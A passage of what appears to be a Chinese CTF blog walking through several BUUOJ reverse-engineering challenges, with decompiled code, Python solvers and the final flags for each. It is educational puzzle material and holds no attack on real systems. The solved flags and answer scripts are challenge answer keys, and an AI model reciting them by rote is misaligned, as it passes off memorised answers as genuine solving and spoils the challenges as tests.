v22 = 99; v23 = 121; v24 = 127; v25 = 121; v26 = 46; v27 = 105; v28 = 127; v29 = 100; v30 = 96; v31 = 51; v32 = 119; v33 = 125; v34 = 119; v35 = 101; v36 = 107; v37 = 57; v38 = 123; v39 = 105; v40 = 121; v41 = 61; v42 = 126; v43 = 121; v44 = 76; v45 = 64; v46 = 69; v47 = 67; memset(v48, 0, sizeof(v48)); v49 = 0; v50 = 0; sub_4406E0(0LL, (__int64)v48); v50 = 0; if ( sub_424BA0(v48) == 36 ) &#123; for ( i = 0; i &lt; (unsigned __int64)sub_424BA0(v48); ++i ) &#123; if ( (unsigned __int8)(v48[i] ^ i) != *(&amp;v12 + i) ) &#123; result = 4294967294LL; goto LABEL_13; &#125; &#125; sub_410CC0((__int64)&quot;continue!&quot;); memset(&amp;v51, 0, 0x40uLL); v53 = 0; sub_4406E0(0LL, (__int64)&amp;v51); v52 = 0; if ( sub_424BA0(&amp;v51) == 39 ) &#123; v1 = sub_400E44((__int64)&amp;v51); v2 = sub_400E44(v1); v3 = sub_400E44(v2); v4 = sub_400E44(v3); v5 = sub_400E44(v4); v6 = sub_400E44(v5); v7 = sub_400E44(v6); v8 = sub_400E44(v7); v9 = sub_400E44(v8); v10 = sub_400E44(v9); if ( !(unsigned int)sub_400360(v10, (__int64)off_6CC090) ) &#123; sub_410CC0((__int64)&quot;You found me!!!&quot;); sub_410CC0((__int64)&quot;bye bye~&quot;); &#125; result = 0LL; &#125; else &#123; result = 0xFFFFFFFDLL; &#125; &#125; else &#123; result = 0xFFFFFFFFLL; &#125;LABEL_13: if ( __readfsqword(0x28u) != v54 ) sub_444020(); return result;&#125; 可以看到v10和off_6CC090进行比较, 相同则输出字符串 而off_6CC090为一段Base64编码 1Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ== 结合前面的代码, 大概可以理解为输入的字符串进行10次Base64编码之后与这段Base64编码相比较 得到的内容为https://bbs.pediy.com/thread-254172.htm 显然这不是flag 12345678for ( i = 0; i &lt; (unsigned __int64)sub_424BA0(v48); ++i ) &#123; if ( (unsigned __int8)(v48[i] ^ i) != *(&amp;v12 + i) ) &#123; result = 4294967294LL; goto LABEL_13; &#125; &#125; 这段代码则将输入值与下标异或之后与一个固定值相比较, 则可以逆向得出正确输入值 123456#!/usr/bin/env python3string = [73, 111, 100, 108, 62, 81, 110, 98, 40, 111, 99, 121, 127, 121, 46, 105, 127, 100, 96, 51, 119, 125, 119, 101, 107, 57, 123, 105, 121, 61, 126, 121, 76, 64, 69, 67]flag = &quot;&quot;for _ in range(len(string)): flag += chr(string[_]^_)print(flag) Info:The first four chars are flag 而在内存分布中off_6CC090的下面存在另外一段字符串qword_6CC0A0 123456qword_6CC0A0 = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B] IDA中右键-&gt;Xrefs graph to..., 得到函数sub_400D35 12345678910111213141516171819202122232425262728293031__int64 sub_400D35()&#123; __int64 result; // rax unsigned __int64 v1; // rt1 unsigned int v2; // [rsp+Ch] [rbp-24h] signed int i; // [rsp+10h] [rbp-20h] signed int j; // [rsp+14h] [rbp-1Ch] unsigned int v5; // [rsp+24h] [rbp-Ch] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); v2 = sub_43FD20() - qword_6CEE38; for ( i = 0; i &lt;= 1233; ++i ) &#123; sub_40F790(v2); sub_40FE60(v2); sub_40FE60(v2); v2 = (unsigned __int64)sub_40FE60(v2) ^ 0x98765432; &#125; v5 = v2; if ( ((unsigned __int8)v2 ^ qword_6CC0A0[0]) == &#x27;f&#x27; &amp;&amp; (HIBYTE(v5) ^ qword_6CC0A0[3]) == &#x27;g&#x27; ) &#123; for ( j = 0; j &lt;= 24; ++j ) sub_410E90(qword_6CC0A0[j] ^ *((_BYTE *)&amp;v5 + j % 4)); &#125; v1 = __readfsqword(0x28u); result = v1 ^ v6; if ( v1 != v6 ) sub_444020(); return result;&#125; 而flag前四字节为&quot;flag&quot;, v5长度也为4字节 即可通过已知明文部分来得出v5, 再通过v5得出flag 123456789string1 = [0x40, 0x35, 0x20, 0x56, 0x5D, 0x18, 0x22, 0x45, 0x17, 0x2F, 0x24, 0x6E, 0x62, 0x3C, 0x27, 0x54, 0x48, 0x6C, 0x24, 0x6E, 0x72, 0x3C, 0x32, 0x45, 0x5B]string2 = &quot;flag&quot;key = []flag = &quot;&quot;for _ in range(len(string2)): key.append(ord(string2[_])^string1[_])for _ in range(len(string1)): flag += chr(string1[_]^key[_%4])print(flag) flag{Act1ve_Defen5e_Test} [ACTF新生赛2020]rome 链接: https://buuoj.cn/challenges#[ACTF新生赛2020]rome EXE 32 IDA中函数 func 的反编译结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899int func()&#123; int result; // eax int v1; // [esp+14h] [ebp-44h] int v2; // [esp+18h] [ebp-40h] int v3; // [esp+1Ch] [ebp-3Ch] int v4; // [esp+20h] [ebp-38h] unsigned __int8 v5; // [esp+24h] [ebp-34h] char c1[22]; unsigned __int8 v6; // [esp+25h] [ebp-33h] unsigned __int8 v7; // [esp+26h] [ebp-32h] unsigned __int8 v8; // [esp+27h] [ebp-31h] unsigned __int8 v9; // [esp+28h] [ebp-30h] int v10; // [esp+29h] [ebp-2Fh] int v11; // [esp+2Dh] [ebp-2Bh] int v12; // [esp+31h] [ebp-27h] int v13; // [esp+35h] [ebp-23h] unsigned __int8 v14; // [esp+39h] [ebp-1Fh] c1 end char v15; // [esp+3Bh] [ebp-1Dh] char v16; // [esp+3Ch] [ebp-1Ch] char v17; // [esp+3Dh] [ebp-1Bh] char v18; // [esp+3Eh] [ebp-1Ah] char v19; // [esp+3Fh] [ebp-19h] char v20; // [esp+40h] [ebp-18h] char v21; // [esp+41h] [ebp-17h] char v22; // [esp+42h] [ebp-16h] char v23; // [esp+43h] [ebp-15h] char v24; // [esp+44h] [ebp-14h] char v25; // [esp+45h] [ebp-13h] char v26; // [esp+46h] [ebp-12h] char v27; // [esp+47h] [ebp-11h] char v28; // [esp+48h] [ebp-10h] char v29; // [esp+49h] [ebp-Fh] char v30; // [esp+4Ah] [ebp-Eh] char v31; // [esp+4Bh] [ebp-Dh] int i; // [esp+4Ch] [ebp-Ch] v15 = 81; v16 = 115; v17 = 119; v18 = 51; v19 = 115; v20 = 106; v21 = 95; v22 = 108; v23 = 122; v24 = 52; v25 = 95; v26 = 85; v27 = 106; v28 = 119; v29 = 64; v30 = 108; v31 = 0; printf(&quot;Please input:&quot;); scanf(&quot;%s&quot;, &amp;v5); result = v5; if ( v5 == &#x27;A&#x27; ) &#123; result = v6; if ( v6 == &#x27;C&#x27; ) &#123; result = v7; if ( v7 == &#x27;T&#x27; ) &#123; result = v8; if ( v8 == &#x27;F&#x27; ) &#123; result = v9; if ( v9 == &#x27;&#123;&#x27; ) &#123; result = v14; if ( v14 == &#x27;&#125;&#x27; ) &#123; v1 = v10; v2 = v11; v3 = v12; v4 = v13; for ( i = 0; i &lt;= 15; ++i ) &#123; if ( *((_BYTE *)&amp;v1 + i) &gt; 64 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 90 ) *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 51) % 26 + 65; if ( *((_BYTE *)&amp;v1 + i) &gt; 96 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 122 ) *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 79) % 26 + 97; &#125; for ( i = 0; i &lt;= 15; ++i ) &#123; result = (unsigned __int8)*(&amp;v15 + i); if ( *((_BYTE *)&amp;v1 + i) != (_BYTE)result ) return result; &#125; result = printf(&quot;You are correct!&quot;); &#125; &#125; &#125; &#125; &#125; &#125; return result;&#125; 12345678for ( i = 0; i &lt;= 15; ++i )&#123; if ( *((_BYTE *)&amp;v1 + i) &gt; 64 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 90 ) *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 51) % 26 + 65; if ( *((_BYTE *)&amp;v1 + i) &gt; 96 &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= 122 ) *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 79) % 26 + 97;&#125; 重点看这段代码 *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 51) % 26 + 65; 与下面的写法等效 *((_BYTE *)&amp;v1 + i) = (*((char *)&amp;v1 + i) - 65 + 14) % 26 + 65; 那么显而易见得就是凯撒密码了 123456789101112#!/usr/bin/env python3cipher = [81, 115, 119, 51, 115, 106, 95, 108, 122, 52, 95, 85, 106, 119, 64, 108]flag = &quot;flag&#123;&quot;for _ in cipher: if _ in range(65, 91): flag += chr(((_-65-14)%26)+65) elif _ in range(97, 123): flag += chr(((_-97-18)%26)+97) else: flag += chr(_)flag += &quot;&#125;&quot;print(flag) flag{Cae3ar_th4_Gre@t} Youngter-drive 链接: https://buuoj.cn/challenges#Youngter-drive EXE 32 存在UPX壳, 脱壳后IDA中 _main_0 函数反编译结果如下 123456789101112131415161718int main_0()&#123; HANDLE v2; // [esp+D0h] [ebp-14h] HANDLE hObject; // [esp+DCh] [ebp-8h] sub_4110FF(); ::hObject = CreateMutexW(0, 0, 0); j_strcpy(Dest, Source); hObject = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0); v2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_41119F, 0, 0, 0); CloseHandle(hObject); CloseHandle(v2); while ( dword_418008 != -1 ) ; sub_411190(); CloseHandle(::hObject); return 0;&#125; 这里可以看到程序使用了多线程 分别跟进两个线程中所运行的函数 1234567891011121314void __stdcall StartAddress_0(int a1)&#123; while ( 1 ) &#123; WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 &gt; -1 ) &#123; sub_41112C((int)Source, dword_418008); --dword_418008; Sleep(0x64u); &#125; ReleaseMutex(hObject); &#125;&#125; 12345678910111213void __stdcall sub_411B10(int a1)&#123; while ( 1 ) &#123; WaitForSingleObject(hObject, 0xFFFFFFFF); if ( dword_418008 &gt; -1 ) &#123; Sleep(0x64u); --dword_418008; &#125; ReleaseMutex(hObject); &#125;&#125; hObject可以理解为一个标识, 先运行StartAddress_0, 此时hObject为空闲状态 WaitForSingleObject在hObject为空闲状态时可以运行后续的代码, 并将hObject设置为繁忙状态, 直到后续代码运行结束之后再运行函数ReleaseMutex, 将hObject为空闲状态设置为空闲状态 而当hObject为空闲状态之前, 函数sub_411B10都在运行WaitForSingleObject, 即等待hObject变为空闲状态 那么函数StartAddress_0, sub_411B10将交替运行 1234567891011121314151617181920char *__cdecl sub_411940(int a1, int a2)&#123; char *result; // eax char v3; // [esp+D3h] [ebp-5h] v3 = *(_BYTE *)(a2 + a1); if ( (v3 &lt; 97 || v3 &gt; 122) &amp;&amp; (v3 &lt; 65 || v3 &gt; 90) ) exit(0); if ( v3 &lt; 97 || v3 &gt; 122 ) &#123; result = off_418000[0]; *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 38]; &#125; else &#123; result = off_418000[0]; *(_BYTE *)(a2 + a1) = off_418000[0][*(char *)(a2 + a1) - 96]; &#125; return result;&#125; 函数sub_411940用于替换所输入的Source字符串 off_418000[0][*(char *)(a2 + a1) - 38]表面上是个二维数组, 但是第一维只有一个值, 所以当一维数组处理即可 dword_418008 = 29 off_418000 = “QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm” 最后运行函数sub_411880(), 用于校验被替换之后的flag是否正确 1234567891011int sub_411880()&#123; int i; // [esp+D0h] [ebp-8h] for ( i = 0; i &lt; 29; ++i ) &#123; if ( Source[i] != off_418004[i] ) exit(0); &#125; return printf(&quot;\\nflag&#123;%s&#125;\\n\\n&quot;, Dest);&#125; off_418004 = “TOiZiZtOrYaToUwPnToBsOaOapsyS” 12345678910111213#!/usr/bin/env python3source = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;off = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;flag = &quot;flag&#123;&quot;for _ in range(len(source)): if _%2 == 0: flag += source[_] elif ord(source[_]) &lt; 97: flag += chr(off.index(source[_])+96) else: flag += chr(off.index(source[_])+38)flag += &quot;&#125;&quot;print(flag) 由于未知原因, 需要加上一个'E'才能正确提交flag 另外一点, dword_418008 = 29, 而字符串长度也为29 在访问off_418004[29]时理论上是访问到\\x00 那么替换时, 会被off_418000[0][-38]所替换 flag{ThisisthreadofwindowshahaIsESE} [FlareOn4]login 链接: https://buuoj.cn/challenges#[FlareOn4]login Javascript 123456789document.getElementById(&quot;prompt&quot;).onclick = function () &#123; var flag = document.getElementById(&quot;flag&quot;).value; var rotFlag = flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;); if (&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot; == rotFlag) &#123; alert(&quot;Correct flag!&quot;); &#125; else &#123; alert(&quot;Incorrect flag, rot again&quot;); &#125;&#125; 由于不熟悉JS, 只能通过在浏览器Console中运行JS来判断加密方法 12345flag = &quot;abcdefghjklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&amp;*()_+-=&quot;&quot;abcdefghjklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&amp;*()_+-=&quot;------flag.replace(/[a-zA-Z]/g, function(c)&#123;return String.fromCharCode((c &lt;= &quot;Z&quot; ? 90 : 122) &gt;= (c = c.charCodeAt(0) + 13) ? c : c - 26);&#125;);&quot;nopqrstuwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM`~!@#$%^&amp;*()_+-=&quot; rot13 1234567891011#!/usr/bin/env python3cipher = &quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;flag = &quot;&quot;for _ in cipher: if 65&lt;=ord(_)&lt;=90: flag += chr((ord(_)-65+13)%26+65) elif 97&lt;=ord(_)&lt;=122: flag += chr((ord(_)-97+13)%26+97) else: flag += _print(flag) flag{ClientSideLoginsAreEasy@flare-on.com} [GUET-CTF2019]re 链接: https://buuoj.cn/challenges#[GUET-CTF2019]re ELF 64 UPX脱壳 字符串aInputYourFlag -&gt; sub_400E28 -&gt; sub_4009AE 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364_BOOL8 __fastcall sub_4009AE(char *a1)&#123; if ( 1629056 * *a1 != 166163712 ) return 0LL; if ( 6771600 * a1[1] != 731332800 ) return 0LL; if ( 3682944 * a1[2] != 357245568 ) return 0LL; if ( 10431000 * a1[3] != 1074393000 ) return 0LL; if ( 3977328 * a1[4] != 489211344 ) return 0LL; if ( 5138336 * a1[5] != 518971936 ) return 0LL; if ( 7532250 * a1[7] != 406741500 ) return 0LL; if ( 5551632 * a1[8] != 294236496 ) return 0LL; if ( 3409728 * a1[9] != 177305856 ) return 0LL; if ( 13013670 * a1[10] != 650683500 ) return 0LL; if ( 6088797 * a1[11] != 298351053 ) return 0LL; if ( 7884663 * a1[12] != 386348487 ) return 0LL; if ( 8944053 * a1[13] != 438258597 ) return 0LL; if ( 5198490 * a1[14] != 249527520 ) return 0LL; if ( 4544518 * a1[15] != 445362764 ) return 0LL; if ( 3645600 * a1[17] != 174988800 ) return 0LL; if ( 10115280 * a1[16] != 981182160 ) return 0LL; if ( 9667504 * a1[18] != 493042704 ) return 0LL; if ( 5364450 * a1[19] != 257493600 ) return 0LL; if ( 13464540 * a1[20] != 767478780 ) return 0LL; if ( 5488432 * a1[21] != 312840624 ) return 0LL; if ( 14479500 * a1[22] != 1404511500 ) return 0LL; if ( 6451830 * a1[23] != 316139670 ) return 0LL; if ( 6252576 * a1[24] != 619005024 ) return 0LL; if ( 7763364 * a1[25] != 372641472 ) return 0LL; if ( 7327320 * a1[26] != 373693320 ) return 0LL; if ( 8741520 * a1[27] != 498266640 ) return 0LL; if ( 8871876 * a1[28] != 452465676 ) return 0LL; if ( 4086720 * a1[29] != 208422720 ) return 0LL; if ( 9374400 * a1[30] == 515592000 ) return 5759124 * a1[31] == 719890500; return 0LL;&#125; 两个坑 没有给出a1[6] a[17]和a[16]调换顺序 1234567#!/usr/bin/env python3num1 = [1629056, 6771600, 3682944, 10431000, 3977328, 5138336, 7532250, 5551632, 3409728, 13013670, 6088797, 7884663, 8944053, 5198490, 4544518, 10115280, 3645600, 9667504, 5364450, 13464540, 5488432, 14479500, 6451830, 6252576, 7763364, 7327320, 8741520, 8871876, 4086720, 9374400, 5759124]num2 = [166163712, 731332800, 357245568, 1074393000, 489211344, 518971936, 406741500, 294236496, 177305856, 650683500, 298351053, 386348487, 438258597, 249527520, 445362764, 981182160, 174988800, 493042704, 257493600, 767478780, 312840624, 1404511500, 316139670, 619005024, 372641472, 373693320, 498266640, 452465676, 208422720, 515592000, 719890500]flag = &quot;&quot;for _ in range(len(num1)): flag += chr(num2[_] // num1[_])print(flag) 最后需要爆破flag[6] flag{e165421110ba03099a1c039337} [SUCTF2019]SignIn 链接: https://buuoj.cn/challenges#[SUCTF2019]SignIn ELF 64 IDA中 main 函数反编译结果如下 1234567891011121314151617181920212223242526272829__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char v4; // [rsp+0h] [rbp-4A0h] char v5; // [rsp+10h] [rbp-490h] char v6; // [rsp+20h] [rbp-480h] char v7; // [rsp+30h] [rbp-470h] char v8; // [rsp+40h] [rbp-460h] char v9; // [rsp+B0h] [rbp-3F0h] unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(&quot;[sign in]&quot;); printf(&quot;[input your flag]: &quot;, a2); __isoc99_scanf(&quot;%99s&quot;, &amp;v8); sub_96A(&amp;v8, (__int64)&amp;v9); __gmpz_init_set_str((__int64)&amp;v7, (__int64)&quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL);// c __gmpz_init_set_str((__int64)&amp;v6, (__int64)&amp;v9, 16LL);// m __gmpz_init_set_str( (__int64)&amp;v4, (__int64)&quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;,// n 10LL); __gmpz_init_set_str((__int64)&amp;v5, (__int64)&quot;65537&quot;, 10LL);// e __gmpz_powm((__int64)&amp;v6, (__int64)&amp;v6, (__int64)&amp;v5, (__int64)&amp;v4);// v6=v6**v5%v4 if ( (unsigned int)__gmpz_cmp(&amp;v6, &amp;v7) ) puts(&quot;GG!&quot;); else puts(&quot;TTTTTTTTTTql!&quot;); return 0LL;&#125; 函数__gmpz_powm((__int64)&amp;v6, (__int64)&amp;v6, (__int64)&amp;v5, (__int64)&amp;v4)意为 v6 = (v6**v5)%v4 最后比较v6与v7 所以很明显就是RSA 123456789101112#!/usr/bin/env python3from Crypto.Util.number import *p = 282164587459512124844245113950593348271q = 366669102002966856876605669837014229419e = 65537c = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35n = p * qphi = (p - 1)*(q - 1)d = inverse(e, phi)m = pow(c, d, n)flag = long_to_bytes(m)print(flag) flag{Pwn_@_hundred_years} 相册 链接: https://buuoj.cn/challenges#相册 Android 下载得到一个APk包, 提取class.dex文件转jar之后也没看到什么有价值的信息 提取libcore.so到IDA中看看 看到一段Base64字符串MTgyMTg0NjUxMjVAMTYzLmNvbQ== 解码之后为18218465125@163.com 即为flag flag{18218465125@163.com} [BJDCTF2020]easy 链接: https://buuoj.cn/challenges#[BJDCTF2020]easy EXE 32 IDA中 _main 函数反编译结果如下 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; time_t v4; // [esp+10h] [ebp-3F0h] struct tm *v5; // [esp+3FCh] [ebp-4h] __main(); time(&amp;v4); v5 = localtime(&amp;v4); puts(&quot;Can you find me?\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 没有得到关于flag的信息 继续查看其他函数 函数 _ques 有数据以及输出 修改一下反编译之后的代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#define SHIDWORD(x) (*((__int32*)&amp;(x)+1))#define LODWORD(x) (*((__int32*)&amp;(x)))#define HIDWORD(x) (*((__int32*)&amp;(x)+1))#include &lt;stdio.h&gt;int main(void)&#123; int v0; int result; int v2[50]; int v3[10] = &#123;2147122737, 140540, 2286567993, 141956, 139457077, 262023, 2286043699, 143749, 2118271985, 143868&#125;; int j; __int64 v14; int v15; int v16; int i; for ( i = 0; i &lt;= 4; ++i ) &#123; memset(v2, 0, sizeof(v2)); v16 = 0; v15 = 0; v0 = *(&amp;v3[1] + 2 * i); LODWORD(v14) = *(&amp;v3[0] + 2 * i); HIDWORD(v14) = v0; while ( SHIDWORD(v14) &gt; 0 || v14 &gt;= 0 &amp;&amp; (__int32)v14 ) &#123; v2[v16++] = ((SHIDWORD(v14) &gt;&gt; 31) ^ (((unsigned __int8)(SHIDWORD(v14) &gt;&gt; 31) ^ (unsigned __int8)v14) - (unsigned __int8)(SHIDWORD(v14) &gt;&gt; 31)) &amp; 1) - (SHIDWORD(v14) &gt;&gt; 31); v14 /= 2LL; &#125; for ( j = 50; j &gt;= 0; --j ) &#123; if ( v2[j] ) &#123; if ( v2[j] == 1 ) &#123; putchar(42); ++v15; &#125; &#125; else &#123; putchar(32); ++v15; &#125; if ( !(v15 % 5) ) putchar(32); &#125; result = putchar(10); &#125; return 0;&#125; 运行即可得到flag IDA Pro反编译代码类型转换参考 flag{HACKIT4FUN} [ACTF新生赛2020]usualCrypt 链接: https://buuoj.cn/challenges#[ACTF新生赛2020]usualCrypt EXE 32 IDA中 _main 函数反编译结果如下 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // esi int result; // eax int v5; // [esp+8h] [ebp-74h] int v6; // [esp+Ch] [ebp-70h] int v7; // [esp+10h] [ebp-6Ch] __int16 v8; // [esp+14h] [ebp-68h] char v9; // [esp+16h] [ebp-66h] char v10; // [esp+18h] [ebp-64h] sub_403CF8(&amp;unk_40E140); scanf(aS, &amp;v10); v5 = 0; v6 = 0; v7 = 0; v8 = 0; v9 = 0; sub_401080((int)&amp;v10, strlen(&amp;v10), (int)&amp;v5); v3 = 0; while ( *((_BYTE *)&amp;v5 + v3) == byte_40E0E4[v3] ) &#123; if ( ++v3 &gt; strlen((const char *)&amp;v5) ) goto LABEL_6; &#125; sub_403CF8(aError);LABEL_6: if ( v3 - 1 == strlen(byte_40E0E4) ) result = sub_403CF8(aAreYouHappyYes); else result = sub_403CF8(aAreYouHappyNo); return result;&#125; 函数 sub_401080 对输入的内容进行变换 继续浏览信息可以看到两个字符串 12char byte_40E0A0[] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;char *byte_40E0AA = &amp;byte_40E0A0[10]; 两个字符串的关系大概是这样 很明显是在进行Base64编码的操作 但是在编码前有函数 sub_401000, 编码后有函数 sub_401030 123456789101112131415signed int sub_401000()&#123; signed int result; // eax char v1; // cl result = 6; do &#123; v1 = byte_40E0AA[result]; byte_40E0AA[result] = byte_40E0A0[result]; byte_40E0A0[result++] = v1; &#125; while ( result &lt; 15 ); return result;&#125; 这个函数的话大概就是在调换Base64编码表, 弄清楚两个字符串的关系即可 123456789101112131415161718192021222324252627282930int __cdecl sub_401030(const char *a1)&#123; __int64 v1; // rax char v2; // al v1 = 0i64; if ( strlen(a1) != 0 ) &#123; do &#123; v2 = a1[HIDWORD(v1)]; if ( v2 &lt; 97 || v2 &gt; 122 ) &#123; if ( v2 &lt; 65 || v2 &gt; 90 ) goto LABEL_9; LOBYTE(v1) = v2 + 32; &#125; else &#123; LOBYTE(v1) = v2 - 32; &#125; a1[HIDWORD(v1)] = v1;LABEL_9: LODWORD(v1) = 0; ++HIDWORD(v1); &#125; while ( HIDWORD(v1) &lt; strlen(a1) ); &#125; return v1;&#125; 大小写转换 12345678910111213141516171819#!/usr/bin/env python3import base64cipher1 = &quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;cipher2 = cipher1.swapcase() # re_sub_401030cipher3 = &quot;&quot;table1 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;table_lst = []for _ in table1: table_lst.append(_)offset = 10for i in range(6, 15): # re_sub_401000 tmp = table_lst[i+offset] table_lst[i+offset] = table_lst[i] table_lst[i] = tmptable2 = &quot;&quot;.join(table_lst)for _ in cipher2: cipher3 += table1[table2.index(_)]flag = base64.b64decode(cipher3)print(flag) flag{bAse64_h2s_a_Surprise} [MRCTF2020]Transform 链接: https://buuoj.cn/challenges#[MRCTF2020]Transform EXE 64 IDA中 main 函数反编译结果如下 1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int64 v3; // rdx __int64 v4; // rdx char v6[104]; // [rsp+20h] [rbp-70h] int j; // [rsp+88h] [rbp-8h] int i; // [rsp+8Ch] [rbp-4h] sub_402230(argc, argv, envp); sub_40E640(argc, (__int64)argv, v3, (__int64)&quot;Give me your code:\\n&quot;); sub_40E5F0(argc, (__int64)argv, (__int64)v6, (unsigned __int64)&quot;%s&quot;); if ( strlen(*(const char **)&amp;argc) != 33 ) &#123; sub_40E640(argc, (__int64)argv, v4, (__int64)&quot;Wrong!\\n&quot;); system(*(const char **)&amp;argc); exit(argc); &#125; for ( i = 0; i &lt;= 32; ++i ) &#123; byte_414040[i] = v6[dword_40F040[i]]; v4 = i; byte_414040[i] ^= LOBYTE(dword_40F040[i]); &#125; for ( j = 0; j &lt;= 32; ++j ) &#123; v4 = j; if ( byte_40F0E0[j] != byte_414040[j] ) &#123; sub_40E640(argc, (__int64)argv, j, (__int64)&quot;Wrong!\\n&quot;); system(*(const char **)&amp;argc); exit(argc); &#125; &#125; sub_40E640(argc, (__int64)argv, v4, (__int64)&quot;Right!Good Job!\\n&quot;); sub_40E640(argc, (__int64)argv, (__int64)v6, (__int64)&quot;Here is your flag: %s\\n&quot;); system(*(const char **)&amp;argc); return 0;&#125; v6为输入的值, 即flag 先将flag字符串打乱顺序, 再进行异或处理 这里值得注意的一点为 dword_40F040[32] = 0x00000000 由于后续还有三个连续的0x00000000, 可能会误以为dword_40F040的长度只有31 1234567891011121314151617181920#!/usr/bin/env python3_40F040 = [0x09, 0x0A, 0x0F, 0x17, 0x07, 0x18, 0x0C, 0x06, 0x01, 0x10, 0x03, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16, 0x04, 0x0D, 0x13, 0x14, 0x15, 0x02, 0x19, 0x05, 0x1F, 0x08, 0x12, 0x1A, 0x1C, 0x0E,0x00]cipher = [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A, 0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]for _ in range(len(cipher)): cipher[_] = cipher[_]^_40F040[_]plain = [0 for _ in range(33)]for _ in range(len(plain)): plain[_40F040[_]] = chr(cipher[_])flag = &#x27;&#x27;.join(plain)print(flag) flag{Tr4nsp0sltiON_Clph3r_1s_3z} [WUSTCTF2020]level1 链接: https://buuoj.cn/challenges#[WUSTCTF2020]level1 ELF 64 IDA中 main 函数反编译结果如下 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&#123; FILE *stream; // ST08_8 signed int i; // [rsp+4h] [rbp-2Ch] char ptr[24]; // [rsp+10h] [rbp-20h] unsigned __int64 v7; // [rsp+28h] [rbp-8h] v7 = __readfsqword(0x28u); stream = fopen(&quot;flag&quot;, &quot;r&quot;); fread(ptr, 1uLL, 20uLL, stream); fclose(stream); for ( i = 1; i 